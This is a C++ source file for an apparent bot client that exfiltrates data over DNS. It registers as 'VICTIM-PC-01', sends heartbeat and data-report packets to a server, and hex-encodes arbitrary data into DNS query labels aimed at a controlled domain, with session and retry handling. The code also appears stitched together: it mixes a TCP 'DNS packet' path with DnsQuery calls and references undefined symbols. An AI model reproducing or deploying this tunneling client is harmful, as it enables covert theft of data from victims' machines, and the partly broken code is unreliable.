#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "Network.h"
#include "Utilities.h"
#include <iostream>
#include <ws2tcpip.h>
#include <string>

// WinAPI
#include <iomanip>
#include <sstream>
#include <windows.h>
#include <windns.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Dnsapi.lib") 

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 53;
const char* BOT_ID = "VICTIM-PC-01";
SOCKET clientSocket = INVALID_SOCKET;

string CreateDNSPacket(const string& jsonData) {
    string packet;
    uint32_t length = static_cast<uint32_t>(jsonData.length());
    packet.append(reinterpret_cast<char*>(&length), 4);
    packet.append(jsonData);
    return packet;
}

bool InitializeConnection() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Connection failed. Error: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        WSACleanup();
        return false;
    }

    cout << "Connected to server on port " << SERVER_PORT << endl;
    return true;
}

bool SendDataTunnel(const string& data) {
    if (clientSocket == INVALID_SOCKET) {
        if (!InitializeConnection()) {
            return false;
        }
    }

    string packet = CreateDNSPacket(data);
    int result = send(clientSocket, packet.c_str(), static_cast<int>(packet.length()), 0);

    if (result == SOCKET_ERROR) {
        cerr << "Send failed. Error: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        return false;
    }

    cout << "Data sent (" << result << " bytes)" << endl;
    return true;
}

void SendManualInput(const string& content) {
    string jsonPacket = CreateJsonPacket("DATA_REPORT", "MANUAL", content);
    cout << "Sending: " << jsonPacket << endl;
    SendDataTunnel(jsonPacket);
}

void SendHeartbeat() {
    string jsonPacket = CreateJsonPacket("HEARTBEAT", "STATUS", "ONLINE");
    SendDataTunnel(jsonPacket);
}

int startConnection(const char* domain) {
	std::string fullString = "a.1.1.1.";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord;
	DNS_STATUS status = DnsQuery_A
		(
			pOwnerName,
			wType,
			dns_options,
			nullptr,
			&pDnsRecord,
			nullptr
		);  // sends two requests for some reason?
	
	if (status) {
		return -1;
	} else {
		IN_ADDR ipaddr;
		ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
		std::string ipStr = inet_ntoa(ipaddr);
		DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
		return std::stoi(ipStr.substr(ipStr.rfind(".") + 1));
	}
}

int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	std::cout << pOwnerName << std::endl;
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord;
	
	DNS_STATUS status = DnsQuery_A
		(
			pOwnerName,
			wType,
			dns_options,
			nullptr,
			&pDnsRecord,
			nullptr
		);
	
	// retry 5 times, then give up this message
	for (int i = 0; i < 5; i++) {
		if (!status) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
			
			int code = std::stoi(ipStr.substr(0, ipStr.find(".")));
			std::cout << "Response Code: " << code << std::endl;
			switch (code) {
				case 200:  // processed normally
					return 0;
				case 201:  // malformed
					break;
				case 202:  // connection non-existent
					{
						int new_id = startConnection(TARGET.c_str());
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;
					break;
				case 203:  // out of order packets
					packetNumber = 0;
					i--;
					break;
				case 204:  // max connections
				default:  // unknown error
					return -1;
			}
		}
		status = DnsQuery_A
		(
			pOwnerName,
			wType,
			dns_options,
			nullptr,
			&pDnsRecord,
			nullptr
		);
	}
	
	return -1;
}

std::string convertToHex(const char* string) {
	std::ostringstream out;
	out << std::hex << std::setfill('0') << std::setw(2);
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(*i);
	}
	return out.str();
}